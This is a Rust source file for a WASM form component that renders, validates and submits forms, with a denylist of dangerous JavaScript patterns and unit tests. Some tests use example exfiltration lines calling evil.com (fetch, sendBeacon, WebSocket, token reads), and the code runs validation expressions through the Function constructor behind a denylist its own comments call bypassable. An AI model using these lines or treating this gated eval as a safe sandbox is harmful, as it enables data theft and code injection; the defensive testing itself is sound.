//! Form Component for Client-Side Rendering (Week 5 Day 3)
//!
//! This module provides a `FormComponent` that renders Django-style forms
//! in WASM using `FormMetadata` from `reinhardt-forms`.
//!
//! ## Architecture
//!
//! ```mermaid
//! flowchart LR
//!     subgraph Server["Server-side"]
//!         Form["Form<br/>to_meta()"]
//!     end
//!
//!     subgraph Client["Client-side (WASM)"]
//!         FormComponent["FormComponent<br/>render()<br/>validate()<br/>submit()"]
//!     end
//!
//!     Form -->|"JSON/etc"| FormComponent
//!     FormComponent --> DOM
//!     FormComponent --> AJAX
//! ```
//!
//! ## Features
//!
//! - **Automatic CSRF Protection**: CSRF token automatically injected as hidden input
//! - **Client-Side Validation**: Validates required fields, displays errors
//! - **Reactive State**: Field values managed with Signals
//! - **AJAX Submission**: Form submission via fetch API with CSRF token
//! - **Widget Rendering**: Renders appropriate input types based on Widget metadata
//!
//! ## Example
//!
//! ```ignore
//! use reinhardt_pages::form::FormComponent;
//! use reinhardt_forms::wasm_compat::FormMetadata;
//!
//! // FormMetadata received from server (serialized as JSON)
//! let metadata: FormMetadata = serde_json::from_str(&json_data)?;
//!
//! // Create FormComponent
//! let mut form = FormComponent::new(metadata, "/api/submit");
//!
//! // Render form to DOM
//! let form_element = form.render();
//! document.body().append_child(&form_element)?;
//!
//! // On submit button click
//! form.submit().await?;
//! ```

#[cfg(wasm)]
use super::validators::ValidatorRegistry;
#[cfg(wasm)]
use crate::dom::{Document, Element};
#[cfg(wasm)]
use crate::reactive::Effect;
use crate::reactive::Signal;
#[cfg(wasm)]
use crate::spawn::spawn_task;
#[cfg(wasm)]
use js_sys::Function;
#[cfg(wasm)]
use reinhardt_forms::wasm_compat::ValidationRule;
use std::collections::HashMap;
#[cfg(wasm)]
use wasm_bindgen::JsValue;

/// Form Component for client-side rendering (Week 5 Day 3)
///
/// This component wraps `FormMetadata` from `reinhardt-forms` and provides
/// methods for rendering, validation, and submission on the client side.
///
/// ## Fields
///
/// - `metadata`: Serialized form metadata from server
/// - `values`: Current field values (Signal-based for reactivity)
/// - `errors`: Validation error messages
/// - `action`: Form submission URL (e.g., "/api/submit")
/// - `method`: HTTP method (default: "POST")
#[derive(Clone)]
pub struct FormComponent {
	/// Form metadata from server
	metadata: reinhardt_forms::wasm_compat::FormMetadata,

	/// Field values (reactive)
	values: HashMap<String, Signal<String>>,

	/// Validation errors
	errors: Signal<HashMap<String, Vec<String>>>,

	/// Form submission URL (used in WASM render() method)
	#[allow(dead_code)] // Field read by WASM render() via cfg(wasm)
	action: String,

	/// HTTP method (GET or POST, used in WASM render() method)
	#[allow(dead_code)] // Field read by WASM render() via cfg(wasm)
	method: String,
}

/// Dangerous patterns that indicate code injection attempts in validation expressions.
///
/// These patterns are blocked because validation expressions should only contain
/// simple comparison and property access logic, not arbitrary code execution.
///
/// # Limitations
///
/// This is a substring/word-boundary denylist, not a full JavaScript parser.
/// Determined attackers may find bypass patterns that a denylist cannot cover
/// (e.g., string concatenation, comment insertion, unicode escapes).
/// A token-level allowlist parser would be a stronger approach and is tracked
/// for future improvement. The denylist raises the bar significantly for
/// the intended use case (form validation expressions authored by developers,
/// not arbitrary end-user input). The primary security boundary is the
/// `validate_js_expression` structural checks (semicolons, assignments)
/// combined with this pattern denylist.
///
/// Patterns are matched with word-boundary checks where applicable to avoid
/// false positives on legitimate field names (e.g., `document_id`, `window_size`).
/// Patterns that include a trailing `.` or `(` act as their own boundary.
///
/// Each entry is `(pattern, description, requires_word_boundary)`:
/// - `requires_word_boundary = true`: only matches when the pattern is NOT
///   preceded or followed by an ASCII alphanumeric char or `_` (i.e., not part
///   of a larger identifier like `document_id`). For patterns ending with `.`,
///   a preceding `.` (member access chain) also skips the match.
/// - `requires_word_boundary = false`: pattern already contains a delimiter
///   (`.` or `(`) so a bare substring match is sufficient
const DANGEROUS_JS_PATTERNS: &[(&str, &str, bool)] = &[
	(
		"eval(",
		"eval() is not allowed in validation expressions",
		false,
	),
	(
		"eval (",
		"eval() is not allowed in validation expressions",
		false,
	),
	(
		"Function(",
		"Function constructor is not allowed in validation expressions",
		false,
	),
	(
		"Function (",
		"Function constructor is not allowed in validation expressions",
		false,
	),
	(
		"import(",
		"Dynamic import is not allowed in validation expressions",
		false,
	),
	(
		"import (",
		"Dynamic import is not allowed in validation expressions",
		false,
	),
	(
		"require(",
		"require() is not allowed in validation expressions",
		false,
	),
	(
		"require (",
		"require() is not allowed in validation expressions",
		false,
	),
	(
		"fetch(",
		"fetch() is not allowed in validation expressions",
		false,
	),
	(
		"fetch (",
		"fetch() is not allowed in validation expressions",
		false,
	),
	(
		"XMLHttpRequest",
		"XMLHttpRequest is not allowed in validation expressions",
		true,
	),
	(
		"document.",
		"DOM access is not allowed in validation expressions",
		true,
	),
	(
		"window.",
		"window access is not allowed in validation expressions",
		true,
	),
	(
		"globalThis.",
		"globalThis access is not allowed in validation expressions",
		true,
	),
	(
		"self.",
		"self access is not allowed in validation expressions",
		true,
	),
	(
		"navigator.",
		"navigator access is not allowed in validation expressions",
		true,
	),
	(
		"location.",
		"location access is not allowed in validation expressions",
		true,
	),
	(
		"localStorage",
		"localStorage is not allowed in validation expressions",
		true,
	),
	(
		"sessionStorage",
		"sessionStorage is not allowed in validation expressions",
		true,
	),
	(
		"cookie",
		"cookie access is not allowed in validation expressions",
		true,
	),
	(
		"setTimeout",
		"setTimeout is not allowed in validation expressions",
		true,
	),
	(
		"setInterval",
		"setInterval is not allowed in validation expressions",
		true,
	),
	(
		"WebSocket",
		"WebSocket is not allowed in validation expressions",
		true,
	),
	(
		"__proto__",
		"prototype manipulation is not allowed in validation expressions",
		false,
	),
	(
		"constructor",
		"constructor access is not allowed in validation expressions",
		true,
	),
	(
		"prototype",
		"prototype access is not allowed in validation expressions",
		true,
	),
	(
		"atob(",
		"atob() is not allowed in validation expressions",
		false,
	),
	(
		"atob (",
		"atob() is not allowed in validation expressions",
		false,
	),
	(
		"btoa(",
		"btoa() is not allowed in validation expressions",
		false,
	),
	(
		"btoa (",
		"btoa() is not allowed in validation expressions",
		false,
	),
];

/// Validate a JavaScript expression for safe evaluation in form validation context.
///
/// This function rejects expressions containing dangerous patterns that could
/// enable code injection, DOM manipulation, network access, or prototype pollution.
/// Only simple comparison and property access expressions are allowed.
///
/// # Arguments
///
/// * `expression` - JavaScript expression to validate
///
/// # Returns
///
/// `Ok(())` if the expression is safe, `Err(String)` describing the violation otherwise.
///
/// # Examples
///
/// ```no_run
/// use reinhardt_pages::form::component::validate_js_expression;
///
/// // Safe expressions
/// assert!(validate_js_expression("value.length >= 8").is_ok());
/// assert!(validate_js_expression("value !== ''").is_ok());
///
/// // Dangerous expressions
/// assert!(validate_js_expression("eval('alert(1)')").is_err());
/// assert!(validate_js_expression("fetch('http://evil.com')").is_err());
/// ```
pub fn validate_js_expression(expression: &str) -> Result<(), String> {
	// Reject empty expressions
	if expression.trim().is_empty() {
		return Err("Empty expression is not allowed".to_string());
	}

	// Block statement-like constructs (semicolons indicate multiple statements)
	if expression.contains(';') {
		return Err(
			"Semicolons are not allowed in validation expressions (use single expressions only)"
				.to_string(),
		);
	}

	// Block assignment operators (but allow === and !==)
	// Check for = that is not preceded or followed by = or !
	let bytes = expression.as_bytes();
	for (i, &byte) in bytes.iter().enumerate() {
		if byte == b'=' {
			let prev = if i > 0 { bytes[i - 1] } else { 0 };
			let next = if i + 1 < bytes.len() { bytes[i + 1] } else { 0 };

			// Allow ==, ===, !=, !==, >=, <=
			if prev == b'=' || prev == b'!' || prev == b'>' || prev == b'<' || next == b'=' {
				continue;
			}

			return Err(
				"Assignment operators are not allowed in validation expressions".to_string(),
			);
		}
	}

	// Check for dangerous patterns using word-boundary awareness to reduce false positives.
	// Patterns with `requires_word_boundary = true` are only flagged when they appear as
	// standalone identifiers (not as part of a larger identifier like `document_id`).
	let expr_bytes = expression.as_bytes();
	for (pattern, description, requires_word_boundary) in DANGEROUS_JS_PATTERNS {
		let mut search_from = 0;
		while let Some(pos) = expression[search_from..].find(pattern) {
			let abs_pos = search_from + pos;

			if *requires_word_boundary {
				// Determine if the pattern ends with a delimiter (`.` or `(`), which
				// affects both preceding and following boundary checks.
				let pattern_bytes = pattern.as_bytes();
				let ends_with_delimiter = matches!(pattern_bytes.last(), Some(b'.') | Some(b'('));

				// Check preceding character: if it is alphanumeric or `_`, the pattern
				// is part of a larger identifier (e.g., `document_id`) and not a match.
				// Additionally, for patterns ending with `.` (global object patterns like
				// `document.`, `window.`), also skip when preceded by `.` to allow member
				// access chains like `fields.document.length`.
				let prev_byte = if abs_pos > 0 {
					expr_bytes[abs_pos - 1]
				} else {
					0
				};
				let is_ident_char = prev_byte.is_ascii_alphanumeric() || prev_byte == b'_';
				let is_member_access = ends_with_delimiter && prev_byte == b'.';
				let preceded_by_ident = is_ident_char || is_member_access;

				// Only check the following boundary if the pattern does not already
				// end with a delimiter. Patterns like `document.` already have a
				// natural boundary at the end.
				let followed_by_ident = if ends_with_delimiter {
					false
				} else {
					let end_pos = abs_pos + pattern.len();
					end_pos < expr_bytes.len()
						&& (expr_bytes[end_pos].is_ascii_alphanumeric()
							|| expr_bytes[end_pos] == b'_')
				};

				if preceded_by_ident || followed_by_ident {
					search_from = abs_pos + pattern.len();
					continue;
				}
			}

			return Err(description.to_string());
		}
	}

	Ok(())
}

impl FormComponent {
	/// Create a new FormComponent from metadata
	///
	/// # Arguments
	///
	/// - `metadata`: Form metadata from server (via `Form::to_metadata()`)
	/// - `action`: Form submission URL (e.g., "/api/submit")
	///
	/// # Examples
	///
	/// ```ignore
	/// use reinhardt_pages::form::FormComponent;
	///
	/// let metadata = form.to_metadata();
	/// let component = FormComponent::new(metadata, "/api/contact");
	/// ```
	pub fn new(
		metadata: reinhardt_forms::wasm_compat::FormMetadata,
		action: impl Into<String>,
	) -> Self {
		// Initialize field values from initial data
		let values: HashMap<String, Signal<String>> = metadata
			.fields
			.iter()
			.map(|field| {
				// Priority: field.initial > metadata.initial > empty string
				let initial_value = field
					.initial
					.as_ref()
					.and_then(|v| v.as_str())
					.or_else(|| metadata.initial.get(&field.name).and_then(|v| v.as_str()))
					.unwrap_or("")
					.to_string();

				(field.name.clone(), Signal::new(initial_value))
			})
			.collect();

		// Initialize errors from metadata (if form is bound)
		let initial_errors = metadata.errors.clone();

		Self {
			metadata,
			values,
			errors: Signal::new(initial_errors),
			action: action.into(),
			method: "POST".to_string(),
		}
	}

	/// Render the form to a DOM element (WASM only)
	///
	/// This method creates a `<form>` element with all fields, labels,
	/// help text, and CSRF token (if present).
	///
	/// # Returns
	///
	/// A `web_sys::Element` representing the rendered form.
	///
	/// # Examples
	///
	/// ```ignore
	/// let form_element = form_component.render();
	/// document.body().append_child(&form_element)?;
	/// ```
	#[cfg(wasm)]
	pub fn render(&self) -> web_sys::Element {
		use crate::builder::html;

		// Create form element
		let form = Document::global()
			.create_element("form")
			.expect("Failed to create form element");

		form.set_attribute("action", &self.action)
			.expect("Failed to set action");
		form.set_attribute("method", &self.method)
			.expect("Failed to set method");

		// Add CSRF token (if present)
		if let Some(ref csrf_token) = self.metadata.csrf_token {
			let csrf_input = Document::global()
				.create_element("input")
				.expect("Failed to create CSRF input");
			csrf_input
				.set_attribute("type", "hidden")
				.expect("Failed to set type");
			csrf_input
				.set_attribute("name", "csrfmiddlewaretoken")
				.expect("Failed to set name");
			csrf_input
				.set_attribute("value", csrf_token)
				.expect("Failed to set value");

			form.append_child(&csrf_input)
				.expect("Failed to append CSRF input");
		}

		// Render each field
		for field_meta in &self.metadata.fields {
			let field_div = self.render_field(field_meta);
			form.append_child(&field_div)
				.expect("Failed to append field");
		}

		// Add submit button
		let submit_button = Document::global()
			.create_element("button")
			.expect("Failed to create submit button");
		submit_button
			.set_attribute("type", "submit")
			.expect("Failed to set type");
		submit_button.set_text_content(Some("Submit"));

		form.append_child(&submit_button)
			.expect("Failed to append submit button");

		// Attach submit event listener
		self.attach_submit_listener(&form);

		form
	}

	/// Render a single field (WASM only)
	#[cfg(wasm)]
	fn render_field(
		&self,
		field_meta: &reinhardt_forms::wasm_compat::FieldMetadata,
	) -> web_sys::Element {
		use reinhardt_forms::Widget;

		let field_div = Document::global()
			.create_element("div")
			.expect("Failed to create field div");
		field_div
			.set_attribute("class", "form-field")
			.expect("Failed to set class");

		// Render label
		if let Some(ref label_text) = field_meta.label {
			let label = Document::global()
				.create_element("label")
				.expect("Failed to create label");
			label
				.set_attribute("for", &field_meta.name)
				.expect("Failed to set for");
			label.set_text_content(Some(label_text));

			if field_meta.required {
				let required_span = Document::global()
					.create_element("span")
					.expect("Failed to create required span");
				required_span
					.set_attribute("class", "required")
					.expect("Failed to set class");
				required_span.set_text_content(Some(" *"));
				label
					.append_child(&required_span)
					.expect("Failed to append required indicator");
			}

			field_div
				.append_child(&label)
				.expect("Failed to append label");
		}

		// Render input based on widget type
		let input = self.render_widget(&field_meta.widget, &field_meta.name);
		field_div
			.append_child(&input)
			.expect("Failed to append input");

		// Render help text
		if let Some(ref help_text) = field_meta.help_text {
			let help_span = Document::global()
				.create_element("span")
				.expect("Failed to create help span");
			help_span
				.set_attribute("class", "help-text")
				.expect("Failed to set class");
			help_span.set_text_content(Some(help_text));
			field_div
				.append_child(&help_span)
				.expect("Failed to append help text");
		}

		// Render errors (reactive)
		let error_div = Document::global()
			.create_element("div")
			.expect("Failed to create error div");
		error_div
			.set_attribute("class", "field-errors")
			.expect("Failed to set class");

		let field_name = field_meta.name.clone();
		let errors_signal = self.errors.clone();

		// Effect: Update error display when errors change
		let error_div_clone = error_div.clone();
		Effect::new(move || {
			let errors = errors_signal.get();
			if let Some(field_errors) = errors.get(&field_name) {
				let error_text = field_errors.join(", ");
				error_div_clone.set_text_content(Some(&error_text));
			} else {
				error_div_clone.set_text_content(None);
			}
		});

		field_div
			.append_child(&error_div)
			.expect("Failed to append error div");

		field_div
	}

	/// Render widget based on type (WASM only)
	#[cfg(wasm)]
	fn render_widget(&self, widget: &reinhardt_forms::Widget, name: &str) -> web_sys::Element {
		use reinhardt_forms::Widget;

		let input = Document::global()
			.create_element("input")
			.expect("Failed to create input");
		input
			.set_attribute("name", name)
			.expect("Failed to set name");

		// Set input type based on widget
		let input_type = match widget {
			Widget::TextInput => "text",
			Widget::PasswordInput => "password",
			Widget::EmailInput => "email",
			Widget::NumberInput => "number",
			Widget::DateInput => "date",
			Widget::CheckboxInput => "checkbox",
			Widget::HiddenInput => "hidden",
			Widget::FileInput => "file",
			_ => "text", // Default fallback
		};

		input
			.set_attribute("type", input_type)
			.expect("Failed to set type");

		// Bind value to Signal
		if let Some(value_signal) = self.values.get(name) {
			let value = value_signal.get();
			input
				.set_attribute("value", &value)
				.expect("Failed to set value");

			// Attach input event listener
			let value_signal_clone = value_signal.clone();
			let input_clone = input.clone();

			use wasm_bindgen::JsCast;
			use wasm_bindgen::prelude::*;

			let closure = Closure::wrap(Box::new(move |_event: web_sys::Event| {
				let target = input_clone
					.clone()
					.dyn_into::<web_sys::HtmlInputElement>()
					.expect("Failed to cast to HtmlInputElement");
				let new_value = target.value();
				value_signal_clone.set(new_value);
			}) as Box<dyn FnMut(_)>);

			input
				.add_event_listener_with_callback("input", closure.as_ref().unchecked_ref())
				.expect("Failed to add event listener");

			closure.forget(); // Keep closure alive
		}

		input
	}

	/// Attach submit event listener (WASM only)
	#[cfg(wasm)]
	fn attach_submit_listener(&self, form: &web_sys::Element) {
		use wasm_bindgen::JsCast;
		use wasm_bindgen::prelude::*;

		let form_component = self.clone();

		let closure = Closure::wrap(Box::new(move |event: web_sys::Event| {
			event.prevent_default();

			// Validate
			if !form_component.validate() {
				crate::warn_log!("Validation failed");
				return;
			}

			// Submit (spawn async task)
			spawn_task(async move {
				match form_component.submit().await {
					Ok(_) => {
						crate::info_log!("Form submitted successfully");
					}
					Err(err) => {
						crate::error_log!("Submit error: {:?}", err);
					}
				}
			});
		}) as Box<dyn FnMut(_)>);

		form.add_event_listener_with_callback("submit", closure.as_ref().unchecked_ref())
			.expect("Failed to add submit listener");

		closure.forget(); // Keep closure alive
	}

	/// Collect all field values into a HashMap (Phase 2-A Helper)
	///
	/// # Returns
	///
	/// `HashMap<field_name, current_value>`
	#[allow(dead_code)] // May be used in future validation features
	fn collect_field_values(&self) -> HashMap<String, String> {
		self.values
			.iter()
			.map(|(name, signal)| (name.clone(), signal.get()))
			.collect()
	}

	/// Evaluate JavaScript expression for field validation (Phase 2-A Helper, WASM only)
	///
	/// # Arguments
	///
	/// - `field_name`: Name of the field being validated
	/// - `expression`: JavaScript expression to evaluate (e.g., "value.length >= 8")
	///
	/// # Returns
	///
	/// `Ok(true)` if validation passes, `Ok(false)` if validation fails,
	/// `Err(String)` if evaluation fails
	///
	/// # Security
	///
	/// This method evaluates JavaScript code in a sandboxed context. The expression
	/// should only contain simple validation logic and must not access external APIs.
	#[cfg(wasm)]
	fn evaluate_js_expression(&self, field_name: &str, expression: &str) -> Result<bool, String> {
		// Validate expression against allowlist before evaluation
		validate_js_expression(expression)?;

		// Get field value
		let value = self.get_value(field_name);

		// Create a safe evaluation context with only 'value' variable
		// We wrap the expression in an immediately-invoked function expression (IIFE)
		// to create a local scope and prevent access to global variables
		let safe_code = format!(
			"(function() {{ var value = {}; return Boolean({}); }})()",
			serde_json::to_string(&value).map_err(|e| format!("JSON encode error: {}", e))?,
			expression
		);

		// Evaluate the expression using Function constructor to run the IIFE.
		// Note: Function constructor is functionally equivalent to eval() for code
		// execution - it parses and runs arbitrary JavaScript with full global access.
		// It does NOT provide any sandboxing or scope isolation.
		// The actual security boundary is provided by `validate_js_expression` above,
		// which rejects dangerous patterns before code reaches this point.
		let func = Function::new_no_args(&format!("return ({});", safe_code));
		let result = func
			.call0(&JsValue::NULL)
			.map_err(|e| format!("JS eval error: {:?}", e))?;

		// Convert to boolean
		result
			.as_bool()
			.ok_or_else(|| "Expression did not return a boolean".to_string())
	}

	/// Evaluate JavaScript expression for cross-field validation (Phase 2-A Helper, WASM only)
	///
	/// # Arguments
	///
	/// - `field_names`: Names of fields involved in validation
	/// - `expression`: JavaScript expression to evaluate (e.g., "fields.password === fields.password_confirm")
	///
	/// # Returns
	///
	/// `Ok(true)` if validation passes, `Ok(false)` if validation fails,
	/// `Err(String)` if evaluation fails
	///
	/// # Security
	///
	/// This method evaluates JavaScript code in a sandboxed context. The expression
	/// should only contain simple validation logic and must not access external APIs.
	#[cfg(wasm)]
	fn evaluate_cross_field_expression(
		&self,
		field_names: &[String],
		expression: &str,
	) -> Result<bool, String> {
		// Validate expression against allowlist before evaluation
		validate_js_expression(expression)?;

		// Collect field values
		let all_values = self.collect_field_values();

		// Filter only the fields involved in this validation
		let mut fields_map = serde_json::Map::new();
		for field_name in field_names {
			if let Some(value) = all_values.get(field_name) {
				fields_map.insert(field_name.clone(), serde_json::Value::String(value.clone()));
			}
		}

		// Create a safe evaluation context with only 'fields' variable
		let safe_code = format!(
			"(function() {{ var fields = {}; return Boolean({}); }})()",
			serde_json::to_string(&fields_map).map_err(|e| format!("JSON encode error: {}", e))?,
			expression
		);

		// Evaluate the expression using Function constructor to run the IIFE.
		// Note: Function constructor is functionally equivalent to eval() for code
		// execution - it parses and runs arbitrary JavaScript with full global access.
		// It does NOT provide any sandboxing or scope isolation.
		// The actual security boundary is provided by `validate_js_expression` above.
		let func = Function::new_no_args(&format!("return ({});", safe_code));
		let result = func
			.call0(&JsValue::NULL)
			.map_err(|e| format!("JS eval error: {:?}", e))?;

		// Convert to boolean
		result
			.as_bool()
			.ok_or_else(|| "Expression did not return a boolean".to_string())
	}

	/// Validate form fields (Week 5 Day 3, Enhanced in Phase 2-A)
	///
	/// Performs client-side validation:
	/// - Checks required fields are not empty
	/// - Evaluates client-side validation rules (WASM only)
	/// - Updates error state via Signal
	///
	/// # Returns
	///
	/// `true` if validation passed, `false` otherwise.
	///
	/// # Examples
	///
	/// ```ignore
	/// if form_component.validate() {
	///     form_component.submit().await?;
	/// }
	/// ```
	pub fn validate(&self) -> bool {
		let mut errors = HashMap::new();
		#[allow(unused_mut)] // mut is only used in WASM target
		let mut non_field_errors: Vec<String> = Vec::new();

		// Step 1: Required field validation (existing logic)
		for field_meta in &self.metadata.fields {
			if field_meta.required
				&& let Some(value_signal) = self.values.get(&field_meta.name)
			{
				let value = value_signal.get();
				if value.trim().is_empty() {
					errors
						.entry(field_meta.name.clone())
						.or_insert_with(Vec::new)
						.push("This field is required.".to_string());
				}
			}
		}

		// Step 2: Process validation rules (Phase 2-A)
		// WASM-only: JavaScript expression evaluation
		#[cfg(wasm)]
		{
			for rule in &self.metadata.validation_rules {
				match rule {
					// Field-level validation
					ValidationRule::FieldValidator {
						field_name,
						expression,
						error_message,
					} => {
						match self.evaluate_js_expression(field_name, expression) {
							Ok(is_valid) => {
								if !is_valid {
									errors
										.entry(field_name.clone())
										.or_insert_with(Vec::new)
										.push(error_message.clone());
								}
							}
							Err(eval_error) => {
								// Log evaluation error for debugging, but don't fail validation
								crate::error_log!(
									"Validation eval error for field '{}': {}",
									field_name,
									eval_error
								);
							}
						}
					}

					// Cross-field validation
					ValidationRule::CrossFieldValidator {
						field_names,
						expression,
						error_message,
						target_field,
					} => {
						match self.evaluate_cross_field_expression(field_names, expression) {
							Ok(is_valid) => {
								if !is_valid {
									// Add error to target field or non-field errors
									if let Some(target) = target_field {
										errors
											.entry(target.clone())
											.or_insert_with(Vec::new)
											.push(error_message.clone());
									} else {
										non_field_errors.push(error_message.clone());
									}
								}
							}
							Err(eval_error) => {
								// Log evaluation error for debugging
								crate::error_log!(
									"Cross-field validation eval error for fields {:?}: {}",
									field_names,
									eval_error
								);
							}
						}
					}

					// Validator reference (Phase 2-A Step 4)
					ValidationRule::ValidatorRef {
						field_name,
						validator_id,
						params,
						error_message,
					} => {
						// Get field value
						let value = self.get_value(field_name);

						// Get validator from registry
						let registry = ValidatorRegistry::global();
						let registry = registry.lock().unwrap_or_else(|e| {
							crate::warn_log!(
								"ValidatorRegistry mutex was poisoned, recovering with potentially inconsistent state"
							);
							e.into_inner()
						});

						match registry.validate(validator_id, &value, params) {
							Ok(_) => {
								// Validation passed
							}
							Err(_validator_error) => {
								// Validation failed - use the error message from ValidationRule
								errors
									.entry(field_name.clone())
									.or_insert_with(Vec::new)
									.push(error_message.clone());
							}
						}
					}
				}
			}
		}

		// Non-WASM: Skip ValidationRule processing
		// Client-side validation is for UX only, server-side validation is mandatory
		#[cfg(native)]
		{
			// In non-WASM environments, we can't evaluate JavaScript expressions
			// Just skip validation rules (they're for UX enhancement only)
			let _ = &self.metadata.validation_rules; // Suppress unused warning
		}

		// Determine if validation passed
		let is_valid = errors.is_empty() && non_field_errors.is_empty();

		// Update error state
		self.errors.set(errors);

		is_valid
	}

	/// Submit form data via AJAX (Week 5 Day 3)
	///
	/// Sends form data to the server with CSRF token automatically included.
	///
	/// # Returns
	///
	/// `Ok(())` on success, `Err(String)` on failure.
	///
	/// # Examples
	///
	/// ```ignore
	/// form_component.submit().await?;
	/// ```
	#[cfg(wasm)]
	pub async fn submit(&self) -> Result<(), String> {
		use serde_json::json;

		// Collect form data
		let mut data = serde_json::Map::new();

		for (name, value_signal) in &self.values {
			let value = value_signal.get();
			data.insert(name.clone(), json!(value));
		}

		// Add CSRF token
		if let Some(ref csrf_token) = self.metadata.csrf_token {
			data.insert("csrfmiddlewaretoken".to_string(), json!(csrf_token));
		}

		// Send POST request
		let response = reqwest::Client::new()
			.post(&self.action)
			.header("Content-Type", "application/json")
			.json(&data)
			.send()
			.await
			.map_err(|e| format!("Failed to send request: {:?}", e))?;

		if response.status().is_success() {
			Ok(())
		} else {
			Err(format!(
				"Submit failed with status: {}",
				response.status().as_u16()
			))
		}
	}

	/// Get current field value
	///
	/// # Arguments
	///
	/// - `name`: Field name
	///
	/// # Returns
	///
	/// Current value as String, or empty string if field not found.
	pub fn get_value(&self, name: &str) -> String {
		self.values
			.get(name)
			.map(|signal| signal.get())
			.unwrap_or_default()
	}

	/// Set field value
	///
	/// # Arguments
	///
	/// - `name`: Field name
	/// - `value`: New value
	pub fn set_value(&self, name: &str, value: impl Into<String>) {
		if let Some(signal) = self.values.get(name) {
			signal.set(value.into());
		}
	}

	/// Get form metadata
	pub fn metadata(&self) -> &reinhardt_forms::wasm_compat::FormMetadata {
		&self.metadata
	}

	/// Get current errors
	pub fn errors(&self) -> HashMap<String, Vec<String>> {
		self.errors.get()
	}
}

#[cfg(test)]
mod tests {
	use super::*;
	use reinhardt_forms::Widget;
	use reinhardt_forms::wasm_compat::{FieldMetadata, FormMetadata};
	use rstest::rstest;
	use std::collections::HashMap;

	// =========================================================================
	// JS Expression Validation Tests (Issue #2622)
	// =========================================================================

	#[rstest]
	#[case("value.length >= 8", "length check")]
	#[case("value !== ''", "non-empty check")]
	#[case("value.trim().length > 0", "trimmed length check")]
	#[case("value >= 0 && value <= 100", "range check")]
	#[case("fields.password === fields.password_confirm", "cross-field equality")]
	#[case("fields.location === 'NY'", "field named location (not global)")]
	#[case("fields.document.length > 0", "field named document (not global)")]
	#[case("fields.navigator !== ''", "field named navigator (not global)")]
	#[case("fields.self === 'active'", "field named self (not global)")]
	#[case("document_id > 0", "identifier containing 'document' as prefix")]
	#[case("window_size >= 100", "identifier containing 'window' as prefix")]
	#[case("my_location.length > 0", "identifier ending with 'location'")]
	#[case("has_cookie === 'true'", "identifier ending with 'cookie'")]
	fn test_validate_js_expression_allows_safe_expressions(
		#[case] expression: &str,
		#[case] _desc: &str,
	) {
		// Arrange & Act
		let result = validate_js_expression(expression);

		// Assert
		assert!(
			result.is_ok(),
			"Expression '{}' should be allowed but was rejected: {:?}",
			expression,
			result.err()
		);
	}

	#[rstest]
	#[case("eval('alert(1)')", "eval")]
	#[case("eval ('alert(1)')", "eval with space")]
	#[case("Function('return 1')()", "Function constructor")]
	#[case("fetch('http://evil.com')", "fetch")]
	#[case("document.cookie", "document access")]
	#[case("window.location", "window access")]
	#[case("globalThis.eval", "globalThis access")]
	#[case("navigator.sendBeacon('http://evil.com', data)", "navigator access")]
	#[case("localStorage.getItem('token')", "localStorage access")]
	#[case("sessionStorage.getItem('token')", "sessionStorage access")]
	#[case("setTimeout(fn, 0)", "setTimeout")]
	#[case("setInterval(fn, 1000)", "setInterval")]
	#[case("new WebSocket('ws://evil.com')", "WebSocket")]
	#[case("XMLHttpRequest", "XMLHttpRequest")]
	#[case("import('malicious-module')", "dynamic import")]
	#[case("require('fs')", "require")]
	#[case("obj.__proto__.polluted", "prototype pollution via __proto__")]
	#[case("obj.constructor.prototype", "prototype pollution via constructor")]
	fn test_validate_js_expression_rejects_dangerous_patterns(
		#[case] expression: &str,
		#[case] _desc: &str,
	) {
		// Arrange & Act
		let result = validate_js_expression(expression);

		// Assert
		assert!(
			result.is_err(),
			"Expression '{}' should be rejected but was allowed",
			expression,
		);
	}

	#[rstest]
	fn test_validate_js_expression_rejects_empty() {
		// Arrange & Act
		let result = validate_js_expression("");

		// Assert
		assert!(result.is_err());
	}

	#[rstest]
	fn test_validate_js_expression_rejects_semicolons() {
		// Arrange - semicolons enable multi-statement injection
		let expression = "value.length >= 8; fetch('http://evil.com')";

		// Act
		let result = validate_js_expression(expression);

		// Assert
		assert!(result.is_err());
	}

	#[rstest]
	fn test_validate_js_expression_rejects_assignment() {
		// Arrange - assignment operators can modify state
		let expression = "value = 'hacked'";

		// Act
		let result = validate_js_expression(expression);

		// Assert
		assert!(result.is_err());
	}

	#[rstest]
	fn test_validate_js_expression_allows_comparison_operators() {
		// Arrange & Act & Assert - comparison operators (==, ===, !=, !==, >=, <=)
		assert!(validate_js_expression("value == 'test'").is_ok());
		assert!(validate_js_expression("value === 'test'").is_ok());
		assert!(validate_js_expression("value != 'test'").is_ok());
		assert!(validate_js_expression("value !== 'test'").is_ok());
		assert!(validate_js_expression("value >= 0").is_ok());
		assert!(validate_js_expression("value <= 100").is_ok());
	}

	#[rstest]
	fn test_validate_js_expression_rejects_self_access() {
		// Arrange
		let expression = "self.fetch('http://evil.com')";

		// Act
		let result = validate_js_expression(expression);

		// Assert
		assert!(result.is_err());
	}

	#[rstest]
	fn test_validate_js_expression_rejects_location_access() {
		// Arrange
		let expression = "location.href = 'http://evil.com'";

		// Act
		let result = validate_js_expression(expression);

		// Assert
		assert!(result.is_err());
	}

	// =========================================================================
	// FormComponent Tests (Existing)
	// =========================================================================

	#[rstest]
	fn test_form_component_creation() {
		// Arrange
		let metadata = FormMetadata {
			fields: vec![FieldMetadata {
				name: "username".to_string(),
				label: Some("Username".to_string()),
				required: true,
				help_text: None,
				widget: Widget::TextInput,
				initial: None,
			}],
			initial: HashMap::new(),
			prefix: String::new(),
			is_bound: false,
			errors: HashMap::new(),
			validation_rules: Vec::new(),
			non_field_errors: Vec::new(),
		};

		// Act
		let component = FormComponent::new(metadata, "/api/submit");

		// Assert
		assert_eq!(component.action, "/api/submit");
		assert_eq!(component.method, "POST");
		assert_eq!(component.values.len(), 1);
		assert!(component.values.contains_key("username"));
	}

	#[rstest]
	fn test_form_component_validation_required_field() {
		let metadata = FormMetadata {
			fields: vec![FieldMetadata {
				name: "email".to_string(),
				label: Some("Email".to_string()),
				required: true,
				help_text: None,
				widget: Widget::EmailInput,
				initial: None,
			}],
			initial: HashMap::new(),
			prefix: String::new(),
			is_bound: false,
			errors: HashMap::new(),
			validation_rules: Vec::new(),
			non_field_errors: Vec::new(),
		};

		let component = FormComponent::new(metadata, "/api/submit");

		// Empty value should fail validation
		assert!(!component.validate());

		let errors = component.errors();
		assert!(errors.contains_key("email"));
		assert_eq!(errors.get("email").unwrap()[0], "This field is required.");

		// Set value and validate again
		component.set_value("email", "test@example.com");
		assert!(component.validate());

		let errors = component.errors();
		assert!(errors.is_empty());
